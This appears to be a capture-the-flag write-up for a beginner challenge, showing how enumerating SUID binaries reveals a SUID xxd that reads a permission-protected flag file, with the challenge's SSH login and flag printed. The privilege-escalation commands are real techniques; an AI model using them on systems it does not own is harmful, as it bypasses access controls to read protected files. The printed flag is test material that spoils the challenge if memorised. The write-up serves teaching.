# Danger

## Challenge Info
- **Category**: beginner
- **Points**: 50
- **Remote**: `ssh Danger@chall.0xfun.org -p59069`
- **Credentials**: `Danger:password`
- **Description**: "Figure out whats hidden!"
- **Flag**: `0xfun{Easy_Access_Granted!}`

## Analysis

### Initial Access
```bash
ssh Danger@chall.0xfun.org -p59069
# Password: password
```

### Reconnaissance
```bash
$ ls -la
total 28
dr-xr-xr-x 1 Danger   Danger   4096 Nov 17 04:44 .
drwxr-xr-x 1 root     root     4096 Nov 17 04:44 ..
-rw-r--r-- 1 Danger   Danger    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 Danger   Danger   3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 Danger   Danger    807 Feb 25  2020 .profile
-rwx------ 1 noaccess noaccess   28 Nov 17 04:44 flag.txt
```

**Key finding**: `flag.txt` is owned by `noaccess:noaccess` with `700` permissions - we cannot read it directly.

## Vulnerability

### SUID Binary Discovery
```bash
$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/xxd          # <-- VULNERABLE!
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

**Vulnerability**: `/usr/bin/xxd` has the SUID bit set, allowing it to run with elevated privileges and read any file on the system.

## Exploitation

### Reading the flag with xxd
```bash
$ xxd flag.txt
00000000: 3078 6675 6e7b 4561 7379 5f41 6363 6573  0xfun{Easy_Acces
00000010: 735f 4772 616e 7465 6421 7d0a            s_Granted!}.
```

### Converting hex to plaintext
```bash
$ xxd -p flag.txt | xxd -r -p
0xfun{Easy_Access_Granted!}
```

## Alternative Solutions

### Using GTFOBins technique
From [GTFOBins - xxd](https://gtfobins.github.io/gtfobins/xxd/):
```bash
# Read file
LFILE=flag.txt
xxd "$LFILE" | xxd -r
```

### Direct plaintext read
```bash
xxd -p flag.txt | xxd -r -p
```

## Key Lessons

1. **SUID binaries are critical attack vectors** - Always enumerate SUID/SGID binaries on Linux systems with `find / -perm -4000` or `find / -perm -2000`

2. **xxd is a powerful file reader** - When xxd has SUID, it can read ANY file on the system regardless of ownership/permissions

3. **GTFOBins is essential** - The [GTFOBins](https://gtfobins.github.io/) project catalogs Unix binaries that can be exploited for privilege escalation when misconfigured with SUID/sudo/capabilities

4. **Beginner challenges teach fundamental concepts** - This challenge demonstrates the core concept of SUID exploitation, which is fundamental to Linux privilege escalation

## References
- [GTFOBins - xxd](https://gtfobins.github.io/gtfobins/xxd/)
- [Linux Privilege Escalation - SUID](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid)
